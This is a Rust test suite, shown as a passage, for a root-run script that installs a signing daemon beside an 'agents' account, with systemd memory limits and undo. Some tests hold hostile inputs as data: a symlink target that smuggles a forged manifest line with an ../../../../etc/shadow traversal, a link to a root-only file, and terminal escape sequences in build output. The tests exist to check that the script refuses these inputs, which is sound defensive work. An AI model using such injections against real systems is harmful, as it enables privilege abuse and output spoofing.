        .find("**Who empties the Trash.**")
        .expect("the 'Who empties the Trash' paragraph");
    let end = doc[at..].find("\n###").map_or(doc.len(), |i| at + i);
    let para = doc[at..end].to_lowercase();
    assert!(
        para.contains("kept bundle"),
        "the sweep paragraph must cover kept bundles: {para}"
    );
    assert!(
        para.contains("disk") && (para.contains("fill") || para.contains("full")),
        "the paragraph must say the disk can fill: {para}"
    );
    for word in [
        "RestrictNamespaces",
        "MemoryMax",
        "TasksMax",
        "SystemCallFilter",
        "/dev/shm",
    ] {
        assert!(
            doc.contains(word),
            "docs/system-mode.md must mention {word}"
        );
    }
    let readme = fs::read_to_string(sitting_dir().join("README.md")).unwrap();
    assert!(
        readme.contains("--slot-memory-max") && readme.contains("--slot-tasks-max"),
        "scripts/sitting/README.md must describe both flags"
    );
}

/// The value of a Rust `const NAME: type = a * b * c;` in a source file, read as text
/// (products of whole numbers, `_` separators and a type suffix allowed). Reading the
/// source keeps the cap tied to the launcher's real constants.
fn const_value(rel: &str, name: &str) -> u64 {
    let path = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join(rel);
    let src = std::fs::read_to_string(&path).unwrap_or_else(|e| panic!("{rel}: {e}"));
    let needle = format!("const {name}:");
    let line = src
        .lines()
        .find(|l| l.contains(&needle) && !l.trim_start().starts_with("//"))
        .unwrap_or_else(|| panic!("{rel}: no `const {name}:` line"));
    let expr = line
        .split_once('=')
        .expect("const has =")
        .1
        .trim()
        .trim_end_matches(';');
    expr.split('*')
        .map(|t| {
            let t: String = t.trim().replace('_', "");
            let t = t
                .trim_end_matches("usize")
                .trim_end_matches("u64")
                .to_string();
            t.parse::<u64>()
                .unwrap_or_else(|_| panic!("{rel}: cannot read {name} = {expr:?}"))
        })
        .product()
}

/// Checks a launcher unit's MemoryMax against the launcher's constants: it must be at
/// least MAX_BULK_READING x MAX_REQUEST_BYTES x 3 + MAX_OTHERS_READING x
/// SMALL_REQUEST_BYTES + 1 GiB of headroom.
///
/// DELIBERATE EVAL CHANGE: strengthened (re-check low P2), from x 2 to x 3 per bulk
/// read. The checker measured a bulk read's worst case at about three times the request,
/// not two: the growing buffer (up to twice the request) plus a copy made from it (one
/// more request's worth) are live together, so a 512 MiB request peaks near 1.5 GiB.
/// With 3 bulk reads that is 4.5 GiB before the small places and the process, which
/// left only about 0.5 GiB of slack under MemoryMax=5G. This is a stricter floor, not a
/// loosened one; the unit must follow it, the test must not be bent to the unit.
fn launchd_memory_cap_problem(unit: &str) -> Option<String> {
    let req = const_value("src/launcher.rs", "MAX_REQUEST_BYTES");
    let bulk = const_value("src/bin/agent_launchd.rs", "MAX_BULK_READING");
    let others = const_value("src/bin/agent_launchd.rs", "MAX_OTHERS_READING");
    let small = const_value("src/bin/agent_launchd.rs", "SMALL_REQUEST_BYTES");
    let need = bulk * req * 3 + others * small + (1u64 << 30);
    let v = values_of(unit, "MemoryMax");
    if v.len() != 1 {
        return Some(format!("needs exactly one MemoryMax: {v:?}"));
    }
    let Some(have) = size_bytes(&v[0]) else {
        return Some(format!("MemoryMax {:?} is not an absolute size", v[0]));
    };
    let v0 = &v[0];
    (have < need).then(|| {
        format!(
            "MemoryMax={v0} ({have} bytes) is below {bulk} x {req} x 3 + {others} x {small} + 1 GiB = {need} bytes"
        )
    })
}

/// P1. The launcher's MemoryMax must cover the constants it really reads with, and
/// must follow them if they change. Reads MAX_REQUEST_BYTES, MAX_BULK_READING,
/// MAX_OTHERS_READING and SMALL_REQUEST_BYTES from the source and MemoryMax from the
/// unit. With 3 x 512 MiB x 3 + 4 x 64 KiB + 1 GiB = 5.5 GiB + 256 KiB (strengthened
/// from x 2, see launchd_memory_cap_problem), so 5G is short: this fails until the cap is raised. The guard half shows the check can fail on its
/// own: a copy of the unit in the test's temp folder with a lower cap is refused, and
/// the exact floor is accepted.
#[test]
fn p1_the_launcher_memory_max_covers_the_constants_it_reads_with() {
    let text = source_unit("agent-launchd.service");
    if let Some(p) = launchd_memory_cap_problem(&text) {
        panic!("P1: agent-launchd.service: {p}");
    }
    // Guard: the check itself can fail, on a copy under the test's temp folder.
    let m = Machine::new();
    let low = m.top.join("agent-launchd.low.service");
    std::fs::write(&low, "[Service]\nMemoryMax=1G\n").unwrap();
    let copy = std::fs::read_to_string(&low).unwrap();
    assert!(
        launchd_memory_cap_problem(&copy).is_some(),
        "P1 guard: 1G must be refused"
    );
    let need =
        3 * const_value("src/launcher.rs", "MAX_REQUEST_BYTES") * 3 + 4 * 64 * 1024 + (1u64 << 30);
    if const_value("src/bin/agent_launchd.rs", "MAX_BULK_READING") == 3
        && const_value("src/bin/agent_launchd.rs", "MAX_OTHERS_READING") == 4
        && const_value("src/bin/agent_launchd.rs", "SMALL_REQUEST_BYTES") == 64 * 1024
    {
        let exact = format!("[Service]\nMemoryMax={need}\n");
        assert!(
            launchd_memory_cap_problem(&exact).is_none(),
            "P1 guard: the exact floor is enough"
        );
        let short = format!("[Service]\nMemoryMax={}\n", need - 1);
        assert!(
            launchd_memory_cap_problem(&short).is_some(),
            "P1 guard: one byte short is refused"
        );
    }
}

/// P2. `--slot-memory-max` takes a percentage (1% to 100%) or a size with a unit
/// suffix K, M, G or T. A bare number (systemd reads 10 as 10 bytes and would stop
/// every session at once) is refused before any change, with a message naming the
/// flag. 2G, 1536M and 50% are accepted.
///
/// Fails today: the script accepts a bare number.
#[test]
fn p2_a_bare_number_for_slot_memory_max_is_refused_and_sized_values_are_accepted() {
    let flag = "--slot-memory-max";
    for good in ["2G", "1536M", "50%", "512K", "1T"] {
        let m = Machine::new();
        must_succeed(&m.sitting(&[flag, good]), &format!("{flag} {good}"));
    }
    for bad in ["10", "1536", "2147483648", "1"] {
        let m = Machine::new();
        let before = m.snap();
        let run = m.sitting(&[flag, bad]);
        must_stop_plainly(&run, &format!("{flag} {bad:?}"), &[flag]);
        assert!(
            diff(&before, &m.snap()).is_empty() && m.mutations().is_empty(),
            "{flag} {bad:?}: the machine changed"
        );
    }
}

// ---------------------------------------------------------------- review 3: M1 and L2

/// The agents' own user-level unit, a REAL file as on hetzner (the old install put it there).
const AGENTS_UNIT_REL: &str = "home/agents/.config/systemd/user/agent-signd.service";
const AGENTS_UNIT_TEXT: &str = "[Unit]\nDescription=agent-signd (the agents' own, user level)\n\n[Service]\nExecStart=%h/.agent-sign/bin/agent-signd\nRestart=on-failure\n# distinctive bytes 7c1e\ttab\n\n[Install]\nWantedBy=default.target\n";

fn machine_with_agents_unit_file() -> Machine {
    let m = Machine::new();
    m.put(AGENTS_UNIT_REL, AGENTS_UNIT_TEXT, 0o640);
    m
}

/// Where the run keeps root's saved copies of the agents' files (the manifest's folder).
fn saved_manifest(m: &Machine) -> Vec<String> {
    lines_of(
        &m.read("var/lib/agent-sign-sitting/before/manifest")
            .unwrap_or_default(),
    )
}

/// M1, found by the independent root-secret review on hetzner's systemd 259. The agents' old
/// `agent-signd.service` is a real file in `~/.config/systemd/user/`; `systemctl --user mask` refuses
/// to mask over a real file ("File ... already exists", status 1). The stand-in now refuses the same
/// way (it let mask always succeed before, which hid this). So D5 must, as the agents account, save
/// the unit file for undo (through the fixed-label manifest, root's folder), remove it, then mask;
/// the run then goes on to the end checks.
///
/// Fails today: mask fails after the new service has started, D5 stops the script, and the checks of
/// the result never run.
#[test]
fn m1_a_real_user_unit_file_is_saved_removed_and_masked_and_the_run_reaches_its_end_checks() {
    let m = machine_with_agents_unit_file();
    let manifest_before_run = saved_manifest(&m).len();
    assert_eq!(manifest_before_run, 0);
    let run = m.sitting(&[]);
    must_succeed(
        &run,
        "a sitting over an agents account with a real user unit file",
    );
    let t = run.text();
    assert!(
        !t.contains("already exists"),
        "mask was refused over the real unit file:\n{t}"
    );
    let checks = check_lines(&run);
    assert!(
        checks
            .iter()
            .any(|(tag, n)| tag == "PASS" && n.contains("stopped, disabled and masked (D5)")),
        "the end check for the old service must run and pass: {checks:?}\n{t}"
    );
    assert!(
        checks.iter().all(|(tag, _)| tag != "FAIL"),
        "an end check failed: {checks:?}"
    );
    assert!(
        run.stdout.contains("Checks of the result"),
        "the run never reached the checks of the result\n{t}"
    );
    // The unit is masked, and the real file is gone from where the agents keep it.
    let u = m.unit("user", "agent-signd.service");
    assert!(
        u.masked && !u.active && !u.enabled,
        "the user unit must be masked and off"
    );
    let md = fs::symlink_metadata(m.path(AGENTS_UNIT_REL));
    assert!(
        md.map(|x| !x.file_type().is_file()).unwrap_or(true),
        "the real unit file is still in the agents' folder"
    );
    // Saved for undo: a copy with the same bytes under root's folder, and one more manifest entry.
    let copies: Vec<PathBuf> = m
        .all_files()
        .into_iter()
        .filter(|(p, b)| {
            b.as_slice() == AGENTS_UNIT_TEXT.as_bytes() && p.starts_with(m.path("var/lib"))
        })
        .map(|(p, _)| p)
        .collect();
    assert!(
        !copies.is_empty(),
        "no saved copy of the unit file under root's folder (var/lib)"
    );
    for c in &copies {
        let mode = fs::metadata(c).unwrap().permissions().mode() & 0o777;
        assert_eq!(
            mode & 0o077,
            0,
            "root's saved copy {c:?} is readable by others: {mode:o}"
        );
    }
    let manifest = saved_manifest(&m);
    assert!(
        manifest.len() > 7,
        "the manifest must hold the unit file besides gitconfig, allowed_signers and the five bin entries: {manifest:?}"
    );
    assert!(
        manifest.iter().all(|l| l.split('|').count() == 4),
        "every manifest line is label|kind|mode|name: {manifest:?}"
    );
    // The mask call was made (and refused nothing).
    assert!(
        m.calls()
            .iter()
            .any(|c| c.name == "systemctl" && c.args.contains(" mask ")),
        "no call masking the user unit"
    );
}

/// M1, undo. Undo unmasks the user unit and puts the real file back, byte for byte and with its
/// mode, and the agents' whole home is as it was before the sitting; the user service runs again.
///
/// Fails today: the run itself stops at mask (see the test above), so there is nothing to undo
/// cleanly; once it passes, this is the check that the file really comes back.
#[test]
fn m1_undo_unmasks_and_puts_the_real_unit_file_back_byte_for_byte() {
    let m = machine_with_agents_unit_file();
    let home_before = m.agents_home();
    must_succeed(&m.sitting(&[]), "the run");
    let undo = m.sitting(&["--undo"]);
    must_succeed(&undo, "the undo");
    assert!(!undo.text().contains("already exists"), "{}", undo.text());
    let md = fs::symlink_metadata(m.path(AGENTS_UNIT_REL))
        .expect("the unit file must be back in the agents' folder");
    assert!(
        md.file_type().is_file(),
        "the unit is back as a real file, not a link to /dev/null"
    );
    assert_eq!(
        fs::read(m.path(AGENTS_UNIT_REL)).unwrap(),
        AGENTS_UNIT_TEXT.as_bytes(),
        "the unit file is not byte for byte as it was"
    );
    assert_eq!(m.mode(AGENTS_UNIT_REL), 0o640, "the unit file's mode");
    let u = m.unit("user", "agent-signd.service");
    assert!(
        u.active && u.enabled && !u.masked,
        "the agents' user service must run again, unmasked"
    );
    let d = diff(&home_before, &m.agents_home());
    assert!(d.is_empty(), "the agents' home is not as it was: {d:?}");
}

/// L2. `sudo` inside `while read ... < manifest` may read the loop's standard input (sudo-rs 0.2.13).
/// The stand-in sudo now does that when its standard input is the manifest file. Undo must read the
/// manifest on its own file descriptor, so every file is restored. A control without the eating
/// sudo shows the same run restores everything.
///
/// Fails today: the first restore's sudo takes the rest of the manifest and the other files stay as
/// the sitting left them.
#[test]
fn l2_a_sudo_that_reads_its_standard_input_does_not_eat_the_manifest() {
    // Control: an ordinary sudo.
    let c = Machine::new();
    let c_before = c.agents_home();
    must_succeed(&c.sitting(&[]), "control run");
    must_succeed(&c.sitting(&["--undo"]), "control undo");
    let d = diff(&c_before, &c.agents_home());
    assert!(
        d.is_empty(),
        "control: undo did not restore the agents' home: {d:?}"
    );

    // The sudo that eats the manifest.
    let m = Machine::new();
    let before = m.agents_home();
    must_succeed(&m.sitting(&[]), "the run");
    m.set("SUDO_EATS_STDIN", "1");
    let undo = m.sitting(&["--undo"]);
    let d = diff(&before, &m.agents_home());
    assert!(
        d.is_empty(),
        "with a sudo that reads its stdin, undo left the agents' files as the sitting changed them: {d:?}\n{}",
        undo.text()
    );
    must_succeed(&undo, "the undo with a sudo that reads its stdin");
}

/// L2, the result check. After restoring, undo re-reads each restored file and compares it with its
/// saved copy, and says so when all match; and when a restore did not take (the write is lost though
/// sudo says it worked), it does not end quietly: it fails with a `Stopped:` line, or says plainly
/// that a file does not match.
///
/// Fails today: a clean undo says nothing of the comparison, and an undo whose writes were lost
/// still ends with exit 0 and no word of it.
#[test]
fn l2_undo_checks_every_restored_file_against_its_saved_copy_and_says_so() {
    let m = Machine::new();
    must_succeed(&m.sitting(&[]), "the run");
    let undo = m.sitting(&["--undo"]);
    must_succeed(&undo, "the undo");
    let low = undo.stdout.to_lowercase();
    assert!(
        low.lines()
            .any(|l| l.contains("match") && l.contains("saved")),
        "a clean undo must say that every restored file matches its saved copy:\n{}",
        undo.stdout
    );

    let m = Machine::new();
    must_succeed(&m.sitting(&[]), "the run");
    m.set("SUDO_LOSES_AGENT_WRITES", "1");
    let undo = m.sitting(&["--undo"]);
    let t = undo.text();
    let low = t.to_lowercase();
    let failed_plainly = undo.code != 0
        && low.contains("stopped:")
        && ["gitconfig", "allowed_signers", "saved copy", "match"]
            .iter()
            .any(|k| low.contains(k));
    let said_so = undo.code == 0
        && [
            "does not match",
            "do not match",
            "mismatch",
            "differs from",
            "differ from",
        ]
        .iter()
        .any(|k| low.contains(k));
    assert!(
        failed_plainly || said_so,
        "undo whose writes were lost must fail plainly or say a file does not match its saved copy (exit {}):\n{t}",
        undo.code
    );
    assert!(
        !low.lines()
            .any(|l| l.contains("every") && l.contains("match") && !l.contains("not")),
        "undo claimed every file matches although the writes were lost:\n{t}"
    );
}

// ---------------------------------------------------------------- review 3: the unit path is a LINK

/// Where a link at the agents' unit path points in these tests: another file the agents own.
const LINKED_TARGET_REL: &str = "home/agents/elsewhere/agent-signd.real.service";

/// A machine whose agents account has put a link at its user-unit path, to another file
/// (systemd's mask refuses over such a link, so an agent could stop step D5 on every run).
/// Returns the machine and the link's target text.
fn machine_with_agents_unit_link_to(target_rel: &str, content: &str) -> (Machine, String) {
    let m = Machine::new();
    m.put(target_rel, content, 0o640);
    let target = m.path(target_rel).display().to_string();
    let link = m.path(AGENTS_UNIT_REL);
    fs::create_dir_all(link.parent().unwrap()).unwrap();
    let _ = fs::remove_file(&link);
    std::os::unix::fs::symlink(&target, &link).unwrap();
    (m, target)
}

fn link_target(m: &Machine, rel: &str) -> Option<String> {
    fs::read_link(m.path(rel))
        .ok()
        .map(|t| t.display().to_string())
}

/// M1 for a link. As for a real file, D5 must, as the agents account, save the link's target as data
/// (fixed-label manifest, root's folder), remove the link, then mask; the run reaches its end checks.
///
/// Fails today: the early return leaves the link, the (now stricter) stand-in refuses mask over a link
/// that does not point at /dev/null, and D5 stops the script after the new service has started.
#[test]
fn m1_a_user_unit_link_to_another_file_is_saved_as_data_removed_and_masked_and_the_run_reaches_its_end_checks()
 {
    let (m, target) = machine_with_agents_unit_link_to(LINKED_TARGET_REL, AGENTS_UNIT_TEXT);
    assert_eq!(saved_manifest(&m).len(), 0);
    let run = m.sitting(&[]);
    must_succeed(
        &run,
        "a sitting over an agents account whose unit path is a link",
    );
    let t = run.text();
    assert!(
        !t.contains("already exists"),
        "mask was refused over the link:\n{t}"
    );
    let checks = check_lines(&run);
    assert!(
        checks
            .iter()
            .any(|(tag, n)| tag == "PASS" && n.contains("stopped, disabled and masked (D5)")),
        "the end check for the old service must run and pass: {checks:?}\n{t}"
    );
    assert!(
        checks.iter().all(|(tag, _)| tag != "FAIL"),
        "an end check failed: {checks:?}"
    );
    assert!(
        run.stdout.contains("Checks of the result"),
        "the run never reached the checks of the result\n{t}"
    );
    let u = m.unit("user", "agent-signd.service");
    assert!(
        u.masked && !u.active && !u.enabled,
        "the user unit must be masked and off"
    );
    // The agents' link is gone from the unit path (what stands there now is only the mask).
    assert_ne!(
        link_target(&m, AGENTS_UNIT_REL).as_deref(),
        Some(target.as_str()),
        "the agents' link to another file is still at the unit path"
    );
    // The file it pointed at is untouched.
    assert_eq!(
        fs::read(m.path(LINKED_TARGET_REL)).unwrap(),
        AGENTS_UNIT_TEXT.as_bytes()
    );
    // The target is in the manifest as data: a saved copy under root's folder holds the target text,
    // every manifest line is still label|kind|mode|name, and there is one entry more than before.
    let holders: Vec<PathBuf> = m
        .all_files()
        .into_iter()
        .filter(|(p, b)| p.starts_with(m.path("var/lib")) && contains(b, &target))
        .map(|(p, _)| p)
        .collect();
    assert!(
        !holders.is_empty(),
        "the link's target is not saved anywhere under root's folder (var/lib)"
    );
    for c in &holders {
        let mode = fs::metadata(c).unwrap().permissions().mode() & 0o777;
        assert_eq!(
            mode & 0o077,
            0,
            "root's saved copy {c:?} is readable by others: {mode:o}"
        );
    }
    let manifest = saved_manifest(&m);
    assert!(
        manifest.len() > 7,
        "the manifest must hold the unit link besides gitconfig, allowed_signers and the five bin entries: {manifest:?}"
    );
    assert!(
        manifest.iter().all(|l| l.split('|').count() == 4),
        "every manifest line is label|kind|mode|name: {manifest:?}"
    );
    assert!(
        m.calls()
            .iter()
            .any(|c| c.name == "systemctl" && c.args.contains(" mask ")),
        "no call masking the user unit"
    );
}

/// M1 for a link, undo. The link comes back with the very same target, the unit is unmasked and runs,
/// and the agents' whole home is as it was.
///
/// Fails today: the run stops at mask, so there is nothing to undo cleanly.
#[test]
fn m1_undo_puts_the_user_unit_link_back_with_the_same_target_and_unmasks() {
    let (m, target) = machine_with_agents_unit_link_to(LINKED_TARGET_REL, AGENTS_UNIT_TEXT);
    let home_before = m.agents_home();
    must_succeed(&m.sitting(&[]), "the run");
    let undo = m.sitting(&["--undo"]);
    must_succeed(&undo, "the undo");
    assert!(!undo.text().contains("already exists"), "{}", undo.text());
    let md = fs::symlink_metadata(m.path(AGENTS_UNIT_REL))
        .expect("the link must be back in the agents' folder");
    assert!(
        md.file_type().is_symlink(),
        "the unit path is not a link again"
    );
    assert_eq!(
        link_target(&m, AGENTS_UNIT_REL).as_deref(),
        Some(target.as_str()),
        "the link does not point where it did (byte for byte)"
    );
    let u = m.unit("user", "agent-signd.service");
    assert!(
        u.active && u.enabled && !u.masked,
        "the agents' user service must run again, unmasked"
    );
    let d = diff(&home_before, &m.agents_home());
    assert!(d.is_empty(), "the agents' home is not as it was: {d:?}");
}

/// M1 for a link, hostile target text. A target holding a newline or a "|" could forge a manifest line,
/// so (as for the bin links) it is refused when the copies are saved, with a plain message, before the
/// agents' files or service are touched.
///
/// Fails today: the early return ignores the link, the run goes on and stops later at mask, not at save.
#[test]
fn m1_a_user_unit_link_target_with_a_newline_or_a_pipe_is_refused_at_save_with_a_plain_message() {
    for bad in [
        "x\ngitconfig|file|644|../../../../etc/shadow",
        "elsewhere|unit|644|y",
    ] {
        let m = Machine::new();
        m.put("etc/shadow", &format!("{CANARY}\n"), 0o600);
        let link = m.path(AGENTS_UNIT_REL);
        fs::create_dir_all(link.parent().unwrap()).unwrap();
        let _ = fs::remove_file(&link);
        std::os::unix::fs::symlink(bad, &link).unwrap();
        let before = m.agents_home();
        let run = m.sitting(&[]);
        must_stop_plainly(
            &run,
            "a unit link target with a newline or a pipe",
            &[
                "link",
                "agent-signd",
                "unit",
                "newline",
                "target",
                "refus",
                "unsafe",
            ],
        );
        assert!(
            !run.text().contains("already exists"),
            "stopped at mask, not at save:\n{}",
            run.text()
        );
        let d = diff(&before, &m.agents_home());
        assert!(
            d.is_empty(),
            "the agents' files changed although the save was refused: {d:?}"
        );
        let u = m.unit("user", "agent-signd.service");
        assert!(
            u.active && u.enabled && !u.masked,
            "the agents' own service must still run after a refused save"
        );
        assert_eq!(link_target(&m, AGENTS_UNIT_REL).as_deref(), Some(bad));
        let leaked = canary_in_agents_files(&m);
        assert!(
            leaked.is_empty(),
            "a root-only file reached the agents: {leaked:?}"
        );
        let manifest = m.read(SAVED_MANIFEST).unwrap_or_default();
        assert!(
            !manifest.contains("etc/shadow"),
            "the manifest holds text made from the link target:\n{manifest}"
        );
    }
}

/// M1 for a link: root never follows it. The agents point the unit path at a root-only file holding a
/// canary. Neither the run nor the undo may copy those bytes into any agents' file or into root's saved
/// copies, and no command run as root may name the agents' unit path (it is handled as the agents).
///
/// Fails today: the early return leaves the link, so the run stops at mask (the other checks here
/// hold only for a run that finishes).
#[test]
fn m1_root_never_reads_through_the_user_unit_link() {
    let m = Machine::new();
    m.put("etc/shadow", &format!("{CANARY}\n"), 0o600);
    let target = m.path("etc/shadow").display().to_string();
    let link = m.path(AGENTS_UNIT_REL);
    fs::create_dir_all(link.parent().unwrap()).unwrap();
    let _ = fs::remove_file(&link);
    std::os::unix::fs::symlink(&target, &link).unwrap();

    let run = m.sitting(&[]);
    must_succeed(
        &run,
        "a sitting with the unit link pointing at a root-only file",
    );
    let undo = m.sitting(&["--undo"]);
    must_succeed(&undo, "the undo");

    let leaked = canary_in_agents_files(&m);
    assert!(
        leaked.is_empty(),
        "a root-only file reached the agents' files: {leaked:?}"
    );
    let in_roots_copies: Vec<PathBuf> = m
        .all_files()
        .into_iter()
        .filter(|(p, b)| p.starts_with(m.path("var/lib")) && contains(b, CANARY))
        .map(|(p, _)| p)
        .collect();
    assert!(
        in_roots_copies.is_empty(),
        "root read through the link into its saved copies: {in_roots_copies:?}"
    );
    for (user, _, cmd) in m.sudo_log() {
        assert!(
            !(user == "root" && cmd.contains(".config/systemd/user/agent-signd.service")),
            "a command run as root names the agents' unit path: {cmd}"
        );
    }
    assert_eq!(
        link_target(&m, AGENTS_UNIT_REL).as_deref(),
        Some(target.as_str()),
        "after undo the link is not back with its target"
    );
}

/// A link already pointing at /dev/null is a mask already in place: the run completes, leaves it, and
/// does not save it as an agents' link to restore.
#[test]
fn m1_a_user_unit_link_to_dev_null_is_a_mask_already_in_place() {
    let m = Machine::new();
    let link = m.path(AGENTS_UNIT_REL);
    fs::create_dir_all(link.parent().unwrap()).unwrap();
    let _ = fs::remove_file(&link);
    std::os::unix::fs::symlink("/dev/null", &link).unwrap();
    let run = m.sitting(&[]);
    must_succeed(&run, "a sitting over an already masked user unit");
    assert!(!run.text().contains("already exists"), "{}", run.text());
    assert_eq!(
        link_target(&m, AGENTS_UNIT_REL).as_deref(),
        Some("/dev/null")
    );
    let u = m.unit("user", "agent-signd.service");
    assert!(
        u.masked && !u.active && !u.enabled,
        "the unit must be masked and off"
    );
}

// ---------------------------------------------------------------- a failed build says why, at the end

// Taylor's first real sitting (2 Nov 2026) stopped with "the throwaway build failed (its own
// messages are above)", and the build's own messages had scrolled out of reach: the fetch
// phase had exited 2 within its first second, and nothing on screen said why. These tests
// (written before the change) require a failed build to end with its own last 40 lines and
// one line naming the step, the exit status and the build's real error.

/// Runs a sitting whose build phase `phase` writes `text` as its messages and exits `rc`.
fn failing_build(m: &Machine, phase: &str, rc: &str, text: &str) -> Run {
    failing_build_bytes(m, phase, rc, text.as_bytes())
}

/// `failing_build` with raw bytes (invalid UTF-8 included).
fn failing_build_bytes(m: &Machine, phase: &str, rc: &str, text: &[u8]) -> Run {
    let f = m.top.join("build-fail.txt");
    fs::write(&f, text).unwrap();
    m.set("BUILD_FAIL_OUT", &f.to_string_lossy());
    m.set("BUILD_FAIL_PHASE", phase);
    m.set("BUILD_FAIL_RC", rc);
    m.sitting(&[])
}

/// The index and text of the last line of `stderr` that starts with "Stopped:".
fn last_stopped(stderr: &str) -> (usize, String) {
    let lines: Vec<&str> = stderr.lines().collect();
    let i = lines
        .iter()
        .rposition(|l| l.starts_with("Stopped:"))
        .unwrap_or_else(|| panic!("no Stopped line:\n{stderr}"));
    (i, lines[i].to_string())
}

/// The non-blank lines of `stderr` above line `stop`, trimmed, in order.
fn nonblank_above(stderr: &str, stop: usize) -> Vec<String> {
    stderr
        .lines()
        .take(stop)
        .filter(|l| !l.trim().is_empty())
        .map(|l| l.trim().to_string())
        .collect()
}

/// The Stopped line of a failed build, built from what the sitting itself knows.
fn build_stopped(step: u8, phase: &str, rc: u8) -> String {
    format!(
        "Stopped: the throwaway build failed in step {step} of 2 ({phase}), exit status {rc}. Nothing was installed."
    )
}

// DELIBERATE EVAL CHANGE (review of fb10599..f34a152, finding 2, 2 Nov 2026): the build's last
// line no longer goes inside the Stopped line, where the build could spoof it ("... Nothing was
// installed. Now run ..."). The Stopped line is built from the sitting's own facts (the step, the
// exit status), and the build's last line is shown on its own line just above it, quoted and
// labelled `last build line: "..."`. The tail and its heading are unchanged.
#[test]
fn a_failed_build_ends_with_its_last_40_lines_and_one_line_naming_the_cause() {
    let m = Machine::new();
    let mut text = String::new();
    for i in 1..=100 {
        text.push_str(&format!("build line {i}\n"));
    }
    text.push_str("tar: This does not look like a tar archive\n");
    text.push_str("tar: Exiting with failure status due to previous errors\n");
    let run = failing_build(&m, "fetch", "2", &text);
    assert_ne!(
        run.code,
        0,
        "the build failed, so the sitting must stop\n{}",
        run.text()
    );

    let lines: Vec<&str> = run.stderr.lines().collect();
    let (stop, s) = last_stopped(&run.stderr);
    assert_eq!(
        s,
        build_stopped(1, "fetch", 2),
        "the Stopped line holds the sitting's own facts only"
    );

    // Just above it, the build's last line, quoted and labelled: tar's real error, not its
    // generic closing line.
    let above = nonblank_above(&run.stderr, stop);
    assert_eq!(
        above.last().map(String::as_str),
        Some("last build line: \"tar: This does not look like a tar archive\""),
        "{}",
        run.stderr
    );
    let above = &above[..above.len() - 1];

    // The 40 non-blank lines above that are the build's last 40, in order, under a heading.
    assert!(above.len() > 41, "too little output:\n{}", run.stderr);
    let tail = &above[above.len() - 40..];
    let mut want: Vec<String> = (63..=100).map(|i| format!("build line {i}")).collect();
    want.push("tar: This does not look like a tar archive".into());
    want.push("tar: Exiting with failure status due to previous errors".into());
    assert_eq!(
        tail,
        want.as_slice(),
        "the build's last 40 lines must sit just above its last line and the Stopped line\n{}",
        run.stderr
    );
    let heading = &above[above.len() - 41];
    assert!(
        heading.contains("last 40 lines") && heading.contains("step 1 of 2"),
        "a heading must name the 40 lines and the step: {heading:?}"
    );

    // The messages were also shown as they came (once), before that heading.
    let first: Vec<usize> = lines
        .iter()
        .enumerate()
        .filter(|(_, l)| l.trim() == "build line 1")
        .map(|(i, _)| i)
        .collect();
    assert_eq!(
        first.len(),
        1,
        "build line 1 must be shown once, live\n{}",
        run.stderr
    );
    assert!(first[0] < stop, "{}", run.stderr);

    // After the Stopped line, nothing repeats the build's output.
    for l in &lines[stop + 1..] {
        assert!(!l.contains("build line"), "after the Stopped line: {l:?}");
    }
}

#[test]
fn a_failed_compile_that_printed_nothing_still_names_its_step_and_exit_status() {
    let m = Machine::new();
    let run = failing_build(&m, "compile", "3", "");
    assert_ne!(run.code, 0, "{}", run.text());
    // DELIBERATE EVAL CHANGE (review finding 2): "printed nothing" is said on its own line.
    let (stop, s) = last_stopped(&run.stderr);
    assert_eq!(s, build_stopped(2, "compile", 3));
    let above = nonblank_above(&run.stderr, stop);
    let last = above.last().map(String::as_str).unwrap_or("");
    assert!(
        last.contains("printed nothing"),
        "the line above the Stopped line must say the build printed nothing: {last:?}"
    );
}

/// The compile phase runs third-party code (build scripts, proc-macros), whose messages reach
/// Taylor's terminal. They must not be able to send it control sequences (a title, a clear
/// screen, a fake prompt), live or in the tail and the cause.
#[test]
fn the_builds_messages_carry_no_terminal_control_characters() {
    let m = Machine::new();
    let text = "plain\n\x1b]0;a title\x07evil one\n\x1b[2Jcleared\r\x1b[31mred cause\n";
    let run = failing_build(&m, "compile", "1", text);
    assert_ne!(run.code, 0, "{}", run.text());
    for (c, name) in [('\x1b', "ESC"), ('\x07', "BEL"), ('\r', "CR")] {
        assert!(
            !run.stderr.contains(c),
            "the sitting's output carries {name} from the build:\n{:?}",
            run.stderr
        );
    }
    assert!(
        run.stderr.contains("evil one") && run.stderr.contains("cleared"),
        "{}",
        run.stderr
    );
    // DELIBERATE EVAL CHANGE (review finding 2): the build's last line, cleaned, is on its own line.
    let (stop, s) = last_stopped(&run.stderr);
    assert_eq!(s, build_stopped(2, "compile", 1));
    let above = nonblank_above(&run.stderr, stop);
    let last = above.last().map(String::as_str).unwrap_or("");
    assert!(
        last.starts_with("last build line: \"") && last.contains("red cause"),
        "{last:?}"
    );
}

/// Before it unpacks anything, each phase's bootstrap says how much room its private /tmp has,
/// so a full /tmp (a 7.6 GB memory filesystem on hetzner, shared with everything) shows.
#[test]
fn each_build_phase_reports_its_free_space_before_unpacking() {
    let m = Machine::new();
    let run = m.sitting(&[]);
    must_succeed(&run, "a sitting");
    let calls = systemd_run_calls(&m);
    let builds: Vec<&Vec<String>> = calls
        .iter()
        .filter(|c| c.iter().any(|a| a.contains("build-in-sandbox.sh")))
        .collect();
    assert_eq!(builds.len(), 2, "two build phases: {calls:?}");
    for c in builds {
        let boot = c
            .iter()
            .find(|a| a.contains("build-in-sandbox.sh"))
            .unwrap();
        let df = boot
            .find("df ")
            .unwrap_or_else(|| panic!("no df in the bootstrap: {boot}"));
        let untar = boot
            .find("tar -x -f -")
            .unwrap_or_else(|| panic!("no tar in the bootstrap: {boot}"));
        assert!(
            df < untar,
            "the free space must be reported before the unpacking: {boot}"
        );
    }
}

/// The sandbox script names a missing or empty source archive in plain words, rather than
/// leaving tar's "This does not look like a tar archive" as the only clue.
#[test]
fn the_sandbox_script_names_a_missing_or_empty_source_archive() {
    let script = fs::read_to_string(sitting_dir().join("files/build-in-sandbox.sh"))
        .expect("files/build-in-sandbox.sh");
    assert!(
        script.contains("/tmp/agent-sign-build"),
        "the test swaps the script's work folder"
    );
    for (case, make) in [("missing", false), ("empty", true)] {
        let t = tempdir().unwrap();
        let work = t.path().join("work");
        fs::create_dir_all(&work).unwrap();
        let copy = t.path().join("build-in-sandbox.sh");
        fs::write(
            &copy,
            script.replace("/tmp/agent-sign-build", &work.to_string_lossy()),
        )
        .unwrap();
        if make {
            fs::write(work.join("source.tar"), b"").unwrap();
        }
        let out = Command::new("bash")
            .arg(&copy)
